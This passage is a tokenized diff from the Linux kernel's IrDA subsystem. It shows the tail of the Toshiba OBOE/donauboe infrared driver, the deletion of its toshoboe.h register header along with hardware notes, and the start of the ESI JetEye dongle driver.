"self", "=", "pci_get_drvdata", "(", "pci_dev", ")", ";", "unsigned", "long", "flags", ";", "if", "(", "!", "self", "|", "|", "!", "self", "-", ">", "stopped", ")", "return", "0", ";", "if", "(", "(!", "self", "-", ">", "irdad", ")", "&", "&", "(", "!", "self", "-", ">", "async", ")", ")", "return", "0", ";", "spin_lock_irqsave", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "toshoboe_startchip", "(", "self", ")", ";", "self", "-", ">", "stopped", "=", "0", ";", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "return", "0", ";", "}", "static", "struct", "pci_driver", "donauboe_pci_driver", "=", "{", ".", "name", "=", "\"", "donauboe", "\"", ",", ".", "id_table", "=", "toshoboe_pci_tbl", ",", ".", "probe", "=", "toshoboe_open", ",", ".", "remove", "=", "toshoboe_close", ",", ".", "suspend", "=", "toshoboe_gotosleep", ",", ".", "resume", "=", "toshoboe_wakeup", "}", ";", "module_pci_driver", "(", "donauboe_pci_driver", ")", ";", "@", "@", "-", "1", ",", "362", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "toshoboe", ".", "h", "*", "Version", ":", "2", ".", "16", "*", "Description", ":", "Driver", "for", "the", "Toshiba", "OBOE", "(", "or", "type", "-", "O", "or", "701", ")", "*", "FIR", "Chipset", ",", "also", "supports", "the", "DONAUOBOE", "(", "type", "-", "DO", "*", "or", "d01", ")", "FIR", "chipset", "which", "as", "far", "as", "I", "know", "is", "*", "register", "compatible", ".", "*", "Status", ":", "Experimental", ".", "*", "Author", ":", "James", "McKenzie", "<", "james", "@", "fishsoup", ".", "dhs", ".", "org", ">", "*", "Created", "at", ":", "Sat", "May", "8", "12", ":", "35", ":", "27", "1999", "*", "Modified", ":", "2", ".", "16", "Martin", "Lucina", "<", "mato", "@", "kotelna", ".", "sk", ">", "*", "Modified", ":", "2", ".", "16", "Sat", "Jun", "22", "18", ":", "54", ":", "29", "2002", "(", "sync", "headers", ")", "*", "Modified", ":", "2", ".", "17", "Christian", "Gennerat", "<", "christian", ".", "gennerat", "@", "polytechnique", ".", "org", ">", "*", "Modified", ":", "2", ".", "17", "jeu", "sep", "12", "08", ":", "50", ":", "20", "2002", "(", "add", "lock", "to", "be", "used", "by", "spinlocks", ")", "*", "*", "Copyright", "(", "c", ")", "1999", "James", "McKenzie", ",", "All", "Rights", "Reserved", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "Neither", "James", "McKenzie", "nor", "Cambridge", "University", "admit", "liability", "nor", "*", "provide", "warranty", "for", "any", "of", "this", "software", ".", "This", "material", "is", "*", "provided", "\"", "AS", "-", "IS", "\"", "and", "at", "no", "charge", ".", "*", "*", "Applicable", "Models", ":", "Libretto", "100", "/", "110CT", "and", "many", "more", ".", "*", "Toshiba", "refers", "to", "this", "chip", "as", "the", "type", "-", "O", "IR", "port", ",", "*", "or", "the", "type", "-", "DO", "IR", "port", ".", "*", "*", "IrDA", "chip", "set", "list", "from", "Toshiba", "Computer", "Engineering", "Corp", ".", "*", "model", "method", "maker", "controller", "Version", "*", "Portege", "320CT", "FIR", ",", "SIR", "Toshiba", "Oboe", "(", "Triangle", ")", "*", "Portege", "3010CT", "FIR", ",", "SIR", "Toshiba", "Oboe", "(", "Sydney", ")", "*", "Portege", "3015CT", "FIR", ",", "SIR", "Toshiba", "Oboe", "(", "Sydney", ")", "*", "Portege", "3020CT", "FIR", ",", "SIR", "Toshiba", "Oboe", "(", "Sydney", ")", "*", "Portege", "7020CT", "FIR", ",", "SIR", "?", "?", "*", "*", "Satell", ".", "4090XCDT", "FIR", ",", "SIR", "?", "?", "*", "*", "Libretto", "100CT", "FIR", ",", "SIR", "Toshiba", "Oboe", "*", "Libretto", "1000CT", "FIR", ",", "SIR", "Toshiba", "Oboe", "*", "*", "TECRA750DVD", "FIR", ",", "SIR", "Toshiba", "Oboe", "(", "Triangle", ")", "REV", "ID", "=", "14h", "*", "TECRA780", "FIR", ",", "SIR", "Toshiba", "Oboe", "(", "Sandlot", ")", "REV", "ID", "=", "32h", ",", "33h", "*", "TECRA750CDT", "FIR", ",", "SIR", "Toshiba", "Oboe", "(", "Triangle", ")", "REV", "ID", "=", "13h", ",", "14h", "*", "TECRA8000", "FIR", ",", "SIR", "Toshiba", "Oboe", "(", "ISKUR", ")", "REV", "ID", "=", "23h", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "/", "*", "The", "documentation", "for", "this", "chip", "is", "allegedly", "released", "*", "/", "/", "*", "However", "I", "have", "not", "seen", "it", ",", "not", "have", "I", "managed", "to", "contact", "*", "/", "/", "*", "anyone", "who", "has", ".", "HOWEVER", "the", "chip", "bears", "a", "striking", "resemblance", "*", "/", "/", "*", "to", "the", "IrDA", "controller", "in", "the", "Toshiba", "RISC", "TMPR3922", "chip", "*", "/", "/", "*", "the", "documentation", "for", "this", "is", "freely", "available", "at", "*", "/", "/", "*", "http", ":", "//", "www", ".", "madingley", ".", "org", "/", "james", "/", "resources", "/", "toshoboe", "/", "TMPR3922", ".", "pdf", "*", "/", "/", "*", "The", "mapping", "between", "the", "registers", "in", "that", "document", "and", "the", "*", "/", "/", "*", "Registers", "in", "the", "701", "oboe", "chip", "are", "as", "follows", "*", "/", "/", "*", "3922", "reg", "701", "regs", ",", "by", "bit", "numbers", "*", "/", "/", "*", "7", "-", "0", "15", "-", "8", "24", "-", "16", "31", "-", "25", "*", "/", "/", "*", "$", "28", "0x0", "0x1", "*", "/", "/", "*", "$", "2c", "SEE", "NOTE", "1", "*", "/", "/", "*", "$", "30", "0x6", "0x7", "*", "/", "/", "*", "$", "34", "0x8", "0x9", "SEE", "NOTE", "2", "*", "/", "/", "*", "$", "38", "0x10", "0x11", "*", "/", "/", "*", "$", "3C", "0xe", "SEE", "NOTE", "3", "*", "/", "/", "*", "$", "40", "0x12", "0x13", "*", "/", "/", "*", "$", "44", "0x14", "0x15", "*", "/", "/", "*", "$", "48", "0x16", "0x17", "*", "/", "/", "*", "$", "4c", "0x18", "0x19", "*", "/", "/", "*", "$", "50", "0x1a", "0x1b", "*", "/", "/", "*", "FIXME", ":", "could", "be", "0x1b", "0x1a", "here", "*", "/", "/", "*", "$", "54", "0x1d", "0x1c", "*", "/", "/", "*", "$", "5C", "0xf", "SEE", "NOTE", "4", "*", "/", "/", "*", "$", "130", "SEE", "NOTE", "5", "*", "/", "/", "*", "$", "134", "SEE", "NOTE", "6", "*", "/", "/", "*", "*", "/", "/", "*", "NOTES", ":", "*", "/", "/", "*", "1", ".", "The", "pointer", "to", "ring", "is", "packed", "in", "most", "unceremoniusly", "*", "/", "/", "*", "701", "Register", "Address", "bits", "(", "A9", "-", "A0", "must", "be", "zero", ")", "*", "/", "/", "*", "0x4", ":", "A17", "A16", "A15", "A14", "A13", "A12", "A11", "A10", "*", "/", "/", "*", "0x5", ":", "A25", "A24", "A23", "A22", "A21", "A20", "A19", "A18", "*", "/", "/", "*", "0x2", ":", "0", "0", "A31", "A30", "A29", "A28", "A27", "A26", "*", "/", "/", "*", "*", "/", "/", "*", "2", ".", "The", "M", "$", "drivers", "do", "a", "write", "0x1", "to", "0x9", ",", "however", "the", "3922", "*", "/", "/", "*", "documentation", "would", "suggest", "that", "a", "write", "of", "0x1", "to", "0x8", "*", "/", "/", "*", "would", "be", "more", "appropriate", ".", "*", "/", "/", "*", "*", "/", "/", "*", "3", ".", "This", "assignment", "is", "tenuous", "at", "best", ",", "register", "0xe", "seems", "to", "*", "/", "/", "*", "have", "bits", "arranged", "0", "0", "0", "R", "/", "W", "R", "/", "W", "R", "/", "W", "R", "/", "W", "R", "/", "W", "*", "/", "/", "*", "if", "either", "of", "the", "lower", "two", "bits", "are", "set", "the", "chip", "seems", "to", "*", "/", "/", "*", "switch", "off", "*", "/", "/", "*", "*", "/", "/", "*", "4", ".", "Bits", "7", "-", "4", "seem", "to", "be", "different", "4", "seems", "just", "to", "be", "generic", "*", "/", "/", "*", "receiver", "busy", "flag", "*", "/", "/", "*", "*", "/", "/", "*", "5", ".", "and", "6", ".", "The", "IER", "and", "ISR", "have", "a", "different", "bit", "assignment", "*", "/", "/", "*", "The", "lower", "three", "bits", "of", "both", "read", "back", "as", "ones", "*", "/", "/", "*", "ISR", "is", "register", "0xc", ",", "IER", "is", "register", "0xd", "*", "/", "/", "*", "7", "6", "5", "4", "3", "2", "1", "0", "*", "/", "/", "*", "0xc", ":", "TxDone", "RxDone", "TxUndr", "RxOver", "SipRcv", "1", "1", "1", "*", "/", "/", "*", "0xd", ":", "TxDone", "RxDone", "TxUndr", "RxOver", "SipRcv", "1", "1", "1", "*", "/", "/", "*", "TxDone", "xmitt", "done", "(", "generated", "only", "if", "generate", "interrupt", "bit", "*", "/", "/", "*", "is", "set", "in", "the", "ring", ")", "*", "/", "/", "*", "RxDone", "recv", "completed", "(", "or", "other", "recv", "condition", "if", "you", "set", "it", "*", "/", "/", "*", "up", "*", "/", "/", "*", "TxUnder", "underflow", "in", "Transmit", "FIFO", "*", "/", "/", "*", "RxOver", "overflow", "in", "Recv", "FIFO", "*", "/", "/", "*", "SipRcv", "received", "serial", "gap", "(", "or", "other", "condition", "you", "set", ")", "*", "/", "/", "*", "Interrupts", "are", "enabled", "by", "writing", "a", "one", "to", "the", "IER", "register", "*", "/", "/", "*", "Interrupts", "are", "cleared", "by", "writing", "a", "one", "to", "the", "ISR", "register", "*", "/", "/", "*", "*", "/", "/", "*", "6", ".", "The", "remaining", "registers", ":", "0x6", "and", "0x3", "appear", "to", "be", "*", "/", "/", "*", "reserved", "parts", "of", "16", "or", "32", "bit", "registersthe", "remainder", "*", "/", "/", "*", "0xa", "0xb", "0x1e", "0x1f", "could", "possibly", "be", "(", "by", "their", "behaviour", ")", "*", "/", "/", "*", "the", "Unicast", "Filter", "register", "at", "$", "58", ".", "*", "/", "/", "*", "*", "/", "/", "*", "7", ".", "While", "the", "core", "obviously", "expects", "32", "bit", "accesses", "all", "the", "*", "/", "/", "*", "M", "$", "drivers", "do", "8", "bit", "accesses", ",", "infact", "the", "Miniport", "ones", "*", "/", "/", "*", "write", "and", "read", "back", "the", "byte", "serveral", "times", "(", "why", "?", ")", "*", "/", "#", "ifndef", "TOSHOBOE_H", "#", "define", "TOSHOBOE_H", "/", "*", "Registers", "*", "/", "#", "define", "OBOE_IO_EXTENT", "0x1f", "/", "*", "Receive", "and", "transmit", "slot", "pointers", "*", "/", "#", "define", "OBOE_REG", "(", "i", ")", "(", "i", "+", "(", "self", "-", ">", "base", ")", ")", "#", "define", "OBOE_RXSLOT", "OBOE_REG", "(", "0x0", ")", "#", "define", "OBOE_TXSLOT", "OBOE_REG", "(", "0x1", ")", "#", "define", "OBOE_SLOT_MASK", "0x3f", "#", "define", "OBOE_TXRING_OFFSET", "0x200", "#", "define", "OBOE_TXRING_OFFSET_IN_SLOTS", "0x40", "/", "*", "pointer", "to", "the", "ring", "*", "/", "#", "define", "OBOE_RING_BASE0", "OBOE_REG", "(", "0x4", ")", "#", "define", "OBOE_RING_BASE1", "OBOE_REG", "(", "0x5", ")", "#", "define", "OBOE_RING_BASE2", "OBOE_REG", "(", "0x2", ")", "#", "define", "OBOE_RING_BASE3", "OBOE_REG", "(", "0x3", ")", "/", "*", "Number", "of", "slots", "in", "the", "ring", "*", "/", "#", "define", "OBOE_RING_SIZE", "OBOE_REG", "(", "0x7", ")", "#", "define", "OBOE_RING_SIZE_RX4", "0x00", "#", "define", "OBOE_RING_SIZE_RX8", "0x01", "#", "define", "OBOE_RING_SIZE_RX16", "0x03", "#", "define", "OBOE_RING_SIZE_RX32", "0x07", "#", "define", "OBOE_RING_SIZE_RX64", "0x0f", "#", "define", "OBOE_RING_SIZE_TX4", "0x00", "#", "define", "OBOE_RING_SIZE_TX8", "0x10", "#", "define", "OBOE_RING_SIZE_TX16", "0x30", "#", "define", "OBOE_RING_SIZE_TX32", "0x70", "#", "define", "OBOE_RING_SIZE_TX64", "0xf0", "#", "define", "OBOE_RING_MAX_SIZE", "64", "/", "*", "Causes", "the", "gubbins", "to", "re", "-", "examine", "the", "ring", "*", "/", "#", "define", "OBOE_PROMPT", "OBOE_REG", "(", "0x9", ")", "#", "define", "OBOE_PROMPT_BIT", "0x1", "/", "*", "Interrupt", "Status", "Register", "*", "/", "#", "define", "OBOE_ISR", "OBOE_REG", "(", "0xc", ")", "/", "*", "Interrupt", "Enable", "Register", "*", "/", "#", "define", "OBOE_IER", "OBOE_REG", "(", "0xd", ")", "/", "*", "Interrupt", "bits", "for", "IER", "and", "ISR", "*", "/", "#", "define", "OBOE_INT_TXDONE", "0x80", "#", "define", "OBOE_INT_RXDONE", "0x40", "#", "define", "OBOE_INT_TXUNDER", "0x20", "#", "define", "OBOE_INT_RXOVER", "0x10", "#", "define", "OBOE_INT_SIP", "0x08", "#", "define", "OBOE_INT_MASK", "0xf8", "/", "*", "Reset", "Register", "*", "/", "#", "define", "OBOE_CONFIG1", "OBOE_REG", "(", "0xe", ")", "#", "define", "OBOE_CONFIG1_RST", "0x01", "#", "define", "OBOE_CONFIG1_DISABLE", "0x02", "#", "define", "OBOE_CONFIG1_4", "0x08", "#", "define", "OBOE_CONFIG1_8", "0x08", "#", "define", "OBOE_CONFIG1_ON", "0x8", "#", "define", "OBOE_CONFIG1_RESET", "0xf", "#", "define", "OBOE_CONFIG1_OFF", "0xe", "#", "define", "OBOE_STATUS", "OBOE_REG", "(", "0xf", ")", "#", "define", "OBOE_STATUS_RXBUSY", "0x10", "#", "define", "OBOE_STATUS_FIRRX", "0x04", "#", "define", "OBOE_STATUS_MIRRX", "0x02", "#", "define", "OBOE_STATUS_SIRRX", "0x01", "/", "*", "Speed", "control", "registers", "*", "/", "#", "define", "OBOE_CONFIG0L", "OBOE_REG", "(", "0x10", ")", "#", "define", "OBOE_CONFIG0H", "OBOE_REG", "(", "0x11", ")", "#", "define", "OBOE_CONFIG0H_TXONLOOP", "0x80", "/", "*", "Transmit", "when", "looping", "(", "dangerous", ")", "*", "/", "#", "define", "OBOE_CONFIG0H_LOOP", "0x40", "/", "*", "Loopback", "Tx", "-", ">", "Rx", "*", "/", "#", "define", "OBOE_CONFIG0H_ENTX", "0x10", "/", "*", "Enable", "Tx", "*", "/", "#", "define", "OBOE_CONFIG0H_ENRX", "0x08", "/", "*", "Enable", "Rx", "*", "/", "#", "define", "OBOE_CONFIG0H_ENDMAC", "0x04", "/", "*", "Enable", "/", "reset", "*", "the", "DMA", "controller", "*", "/", "#", "define", "OBOE_CONFIG0H_RCVANY", "0x02", "/", "*", "DMA", "mode", "1", "=", "bytes", ",", "0", "=", "dwords", "*", "/", "#", "define", "OBOE_CONFIG0L_CRC16", "0x80", "/", "*", "CRC", "1", "=", "16", "bit", "0", "=", "32", "bit", "*", "/", "#", "define", "OBOE_CONFIG0L_ENFIR", "0x40", "/", "*", "Enable", "FIR", "*", "/", "#", "define", "OBOE_CONFIG0L_ENMIR", "0x20", "/", "*", "Enable", "MIR", "*", "/", "#", "define", "OBOE_CONFIG0L_ENSIR", "0x10", "/", "*", "Enable", "SIR", "*", "/", "#", "define", "OBOE_CONFIG0L_ENSIRF", "0x08", "/", "*", "Enable", "SIR", "framer", "*", "/", "#", "define", "OBOE_CONFIG0L_SIRTEST", "0x04", "/", "*", "Enable", "SIR", "framer", "in", "MIR", "and", "FIR", "*", "/", "#", "define", "OBOE_CONFIG0L_INVERTTX", "0x02", "/", "*", "Invert", "Tx", "Line", "*", "/", "#", "define", "OBOE_CONFIG0L_INVERTRX", "0x01", "/", "*", "Invert", "Rx", "Line", "*", "/", "#", "define", "OBOE_BOF", "OBOE_REG", "(", "0x12", ")", "#", "define", "OBOE_EOF", "OBOE_REG", "(", "0x13", ")", "#", "define", "OBOE_ENABLEL", "OBOE_REG", "(", "0x14", ")", "#", "define", "OBOE_ENABLEH", "OBOE_REG", "(", "0x15", ")", "#", "define", "OBOE_ENABLEH_PHYANDCLOCK", "0x80", "/", "*", "Toggle", "low", "to", "copy", "config", "in", "*", "/", "#", "define", "OBOE_ENABLEH_CONFIGERR", "0x40", "#", "define", "OBOE_ENABLEH_FIRON", "0x20", "#", "define", "OBOE_ENABLEH_MIRON", "0x10", "#", "define", "OBOE_ENABLEH_SIRON", "0x08", "#", "define", "OBOE_ENABLEH_ENTX", "0x04", "#", "define", "OBOE_ENABLEH_ENRX", "0x02", "#", "define", "OBOE_ENABLEH_CRC16", "0x01", "#", "define", "OBOE_ENABLEL_BROADCAST", "0x01", "#", "define", "OBOE_CURR_PCONFIGL", "OBOE_REG", "(", "0x16", ")", "/", "*", "Current", "config", "*", "/", "#", "define", "OBOE_CURR_PCONFIGH", "OBOE_REG", "(", "0x17", ")", "#", "define", "OBOE_NEW_PCONFIGL", "OBOE_REG", "(", "0x18", ")", "#", "define", "OBOE_NEW_PCONFIGH", "OBOE_REG", "(", "0x19", ")", "#", "define", "OBOE_PCONFIGH_BAUDMASK", "0xfc", "#", "define", "OBOE_PCONFIGH_WIDTHMASK", "0x04", "#", "define", "OBOE_PCONFIGL_WIDTHMASK", "0xe0", "#", "define", "OBOE_PCONFIGL_PREAMBLEMASK", "0x1f", "#", "define", "OBOE_PCONFIG_BAUDMASK", "0xfc00", "#", "define", "OBOE_PCONFIG_BAUDSHIFT", "10", "#", "define", "OBOE_PCONFIG_WIDTHMASK", "0x04e0", "#", "define", "OBOE_PCONFIG_WIDTHSHIFT", "5", "#", "define", "OBOE_PCONFIG_PREAMBLEMASK", "0x001f", "#", "define", "OBOE_PCONFIG_PREAMBLESHIFT", "0", "#", "define", "OBOE_MAXLENL", "OBOE_REG", "(", "0x1a", ")", "#", "define", "OBOE_MAXLENH", "OBOE_REG", "(", "0x1b", ")", "#", "define", "OBOE_RXCOUNTH", "OBOE_REG", "(", "0x1c", ")", "/", "*", "Reset", "on", "recipt", "*", "/", "#", "define", "OBOE_RXCOUNTL", "OBOE_REG", "(", "0x1d", ")", "/", "*", "of", "whole", "packet", "*", "/", "/", "*", "The", "PCI", "ID", "of", "the", "OBOE", "chip", "*", "/", "#", "ifndef", "PCI_DEVICE_ID_FIR701", "#", "define", "PCI_DEVICE_ID_FIR701", "0x0701", "#", "endif", "#", "ifndef", "PCI_DEVICE_ID_FIRD01", "#", "define", "PCI_DEVICE_ID_FIRD01", "0x0d01", "#", "endif", "struct", "OboeSlot", "{", "__u16", "len", ";", "/", "*", "Tweleve", "bits", "of", "packet", "length", "*", "/", "__u8", "unused", ";", "__u8", "control", ";", "/", "*", "Slot", "control", "/", "status", "see", "below", "*", "/", "__u32", "address", ";", "/", "*", "Slot", "buffer", "address", "*", "/", "}", "__packed", ";", "#", "define", "OBOE_NTASKS", "OBOE_TXRING_OFFSET_IN_SLOTS", "struct", "OboeRing", "{", "struct", "OboeSlot", "rx", "[", "OBOE_NTASKS", "]", ";", "struct", "OboeSlot", "tx", "[", "OBOE_NTASKS", "]", ";", "}", ";", "#", "define", "OBOE_RING_LEN", "(", "sizeof", "(", "struct", "OboeRing", ")", ")", "#", "define", "OBOE_CTL_TX_HW_OWNS", "0x80", "/", "*", "W", "/", "R", "This", "slot", "owned", "by", "the", "hardware", "*", "/", "#", "define", "OBOE_CTL_TX_DISTX_CRC", "0x40", "/", "*", "W", "Disable", "CRC", "generation", "for", "[", "FM", "]", "IR", "*", "/", "#", "define", "OBOE_CTL_TX_BAD_CRC", "0x20", "/", "*", "W", "Generate", "bad", "CRC", "*", "/", "#", "define", "OBOE_CTL_TX_SIP", "0x10", "/", "*", "W", "Generate", "an", "SIP", "after", "xmittion", "*", "/", "#", "define", "OBOE_CTL_TX_MKUNDER", "0x08", "/", "*", "W", "Generate", "an", "underrun", "error", "*", "/", "#", "define", "OBOE_CTL_TX_RTCENTX", "0x04", "/", "*", "W", "Enable", "receiver", "and", "generate", "TXdone", "*", "/", "/", "*", "After", "this", "slot", "is", "processed", "*", "/", "#", "define", "OBOE_CTL_TX_UNDER", "0x01", "/", "*", "R", "Set", "by", "hardware", "to", "indicate", "underrun", "*", "/", "#", "define", "OBOE_CTL_RX_HW_OWNS", "0x80", "/", "*", "W", "/", "R", "This", "slot", "owned", "by", "hardware", "*", "/", "#", "define", "OBOE_CTL_RX_PHYERR", "0x40", "/", "*", "R", "Decoder", "error", "on", "receiption", "*", "/", "#", "define", "OBOE_CTL_RX_CRCERR", "0x20", "/", "*", "R", "CRC", "error", "only", "set", "for", "[", "FM", "]", "IR", "*", "/", "#", "define", "OBOE_CTL_RX_LENGTH", "0x10", "/", "*", "R", "Packet", ">", "max", "Rx", "length", "*", "/", "#", "define", "OBOE_CTL_RX_OVER", "0x08", "/", "*", "R", "set", "to", "indicate", "an", "overflow", "*", "/", "#", "define", "OBOE_CTL_RX_SIRBAD", "0x04", "/", "*", "R", "SIR", "had", "BOF", "in", "packet", "or", "ABORT", "sequence", "*", "/", "#", "define", "OBOE_CTL_RX_RXEOF", "0x02", "/", "*", "R", "Finished", "receiving", "on", "this", "slot", "*", "/", "struct", "toshoboe_cb", "{", "struct", "net_device", "*", "netdev", ";", "/", "*", "Yes", "!", "we", "are", "some", "kind", "of", "netdevice", "*", "/", "struct", "tty_driver", "ttydev", ";", "struct", "irlap_cb", "*", "irlap", ";", "/", "*", "The", "link", "layer", "we", "are", "binded", "to", "*", "/", "chipio_t", "io", ";", "/", "*", "IrDA", "controller", "information", "*", "/", "struct", "qos_info", "qos", ";", "/", "*", "QoS", "capabilities", "for", "this", "device", "*", "/", "__u32", "flags", ";", "/", "*", "Interface", "flags", "*", "/", "struct", "pci_dev", "*", "pdev", ";", "/", "*", "PCI", "device", "*", "/", "int", "base", ";", "/", "*", "IO", "base", "*", "/", "int", "txpending", ";", "/", "*", "how", "many", "tx", "'", "s", "are", "pending", "*", "/", "int", "txs", ",", "rxs", ";", "/", "*", "Which", "slots", "are", "we", "at", "*", "/", "int", "irdad", ";", "/", "*", "Driver", "under", "control", "of", "netdev", "end", "*", "/", "int", "async", ";", "/", "*", "Driver", "under", "control", "of", "async", "end", "*", "/", "int", "stopped", ";", "/", "*", "Stopped", "by", "some", "or", "other", "APM", "stuff", "*", "/", "int", "filter", ";", "/", "*", "In", "SIR", "mode", "do", "we", "want", "to", "receive", "frames", "or", "byte", "ranges", "*", "/", "void", "*", "ringbuf", ";", "/", "*", "The", "ring", "buffer", "*", "/", "struct", "OboeRing", "*", "ring", ";", "/", "*", "The", "ring", "*", "/", "void", "*", "tx_bufs", "[", "OBOE_RING_MAX_SIZE", "]", ";", "/", "*", "The", "buffers", "*", "/", "void", "*", "rx_bufs", "[", "OBOE_RING_MAX_SIZE", "]", ";", "int", "speed", ";", "/", "*", "Current", "setting", "of", "the", "speed", "*", "/", "int", "new_speed", ";", "/", "*", "Set", "to", "request", "a", "speed", "change", "*", "/", "/", "*", "The", "spinlock", "protect", "critical", "parts", "of", "the", "driver", ".", "*", "Locking", "is", "done", "like", "this", ":", "*", "spin_lock_irqsave", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "*", "Releasing", "the", "lock", ":", "*", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "*", "/", "spinlock_t", "spinlock", ";", "/", "*", "Used", "for", "the", "probe", "and", "diagnostics", "code", "*", "/", "int", "int_rx", ";", "int", "int_tx", ";", "int", "int_txunder", ";", "int", "int_rxover", ";", "int", "int_sip", ";", "}", ";", "#", "endif", "@", "@", "-", "1", ",", "157", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "esi", ".", "c", "*", "Version", ":", "1", ".", "6", "*", "Description", ":", "Driver", "for", "the", "Extended", "Systems", "JetEye", "PC", "dongle", "*", "Status", ":", "Experimental", ".", "*", "Author", ":", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "*", "Created", "at", ":", "Sat", "Feb", "21", "18", ":", "54", ":", "38", "1998", "*", "Modified", "at", ":", "Sun", "Oct", "27", "22", ":", "01", ":", "04", "2002", "*", "Modified", "by", ":", "Martin", "Diehl", "<", "mad", "@", "mdiehl", ".", "de", ">", "*", "*", "Copyright", "(", "c", ")", "1999", "Dag", "Brattli", ",", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", ",", "*", "Copyright", "(", "c", ")", "1998", "Thomas", "Davis", ",", "<", "ratbert", "@", "radiks", ".", "net", ">", ",", "*", "Copyright", "(", "c", ")", "2002", "Martin", "Diehl", ",", "<", "mad", "@", "mdiehl", ".", "de", ">", ",", "*", "All", "Rights", "Reserved", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "see", "<", "http", ":", "//", "www", ".", "gnu", ".", "org", "/", "licenses", "/", ">.", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "\"", "sir", "-", "dev", ".", "h", "\"", "static", "int", "esi_open", "(", "struct", "sir_dev", "*", ");", "static", "int", "esi_close", "(", "struct", "sir_dev", "*", ");", "static", "int", "esi_change_speed", "(", "struct", "sir_dev", "*", ",", "unsigned", ")", ";", "static", "int", "esi_reset", "(", "struct", "sir_dev", "*", ");", "static", "struct", "dongle_driver", "esi", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "driver_name", "=", "\"", "JetEye", "PC", "ESI", "-", "9680", "PC", "\"", ",", ".", "type", "=", "IRDA_ESI_DONGLE", ",", ".", "open", "=", "esi_open", ",", ".", "close", "=", "esi_close", ",", ".", "reset", "=", "esi_reset", ",", ".", "set_speed", "=", "esi_change_speed", ",", "}", ";", "static", "int", "__init", "esi_sir_init", "(", "void", ")", "{", "return", "irda_register_dongle", "(", "&", "esi", ")", ";", "}", "static", "void", "__exit", "esi_sir_cleanup", "(", "void", ")", "{", "irda_unregister_dongle", "(", "&", "esi", ")", ";", "}", "static", "int", "esi_open", "(", "struct", "sir_dev", "*", "dev", ")", "{", "struct", "qos_info", "*", "qos", "=", "&", "dev", "-", ">", "qos", ";", "/", "*", "Power", "up", "and", "set", "dongle", "to", "9600", "baud", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "TRUE", ")", ";", "qos", "-", ">", "baud_rate", ".", "bits", "&", "=", "IR_9600", "|", "IR_19200", "|", "IR_115200", ";", "qos", "-", ">", "min_turn_time", ".", "bits", "=", "0x01", ";", "/", "*", "Needs", "at", "least", "10", "ms", "*", "/", "irda_qos_bits_to_value", "(", "qos", ")", ";", "/", "*", "irda", "thread", "waits", "50", "msec", "for", "power", "settling", "*", "/", "return", "0", ";", "}", "static", "int", "esi_close", "(", "struct", "sir_dev", "*", "dev", ")", "{", "/", "*", "Power", "off", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "FALSE", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "esi_change_speed", "(", "task", ")", "*", "*", "Set", "the", "speed", "for", "the", "Extended", "Systems", "JetEye", "PC", "ESI", "-", "9680", "type", "dongle", "*", "Apparently", "(", "see", "old", "esi", "-", "driver", ")", "no", "delays", "are", "needed", "here", ".", "..", "*", "*", "/", "static", "int", "esi_change_speed", "(", "struct", "sir_dev", "*", "dev", ",", "unsigned", "speed", ")", "{", "int", "ret", "=", "0", ";", "int", "dtr", ",", "rts", ";", "switch", "(", "speed", ")", "{", "case", "19200", ":", "dtr", "=", "TRUE", ";", "rts", "=", "FALSE", ";", "break", ";", "case", "115200", ":", "dtr", "=", "rts", "=", "TRUE", ";", "break", ";", "default", ":", "ret", "=", "-", "EINVAL", ";", "speed", "=", "9600", ";", "/", "*", "fall", "through", "*", "/", "case", 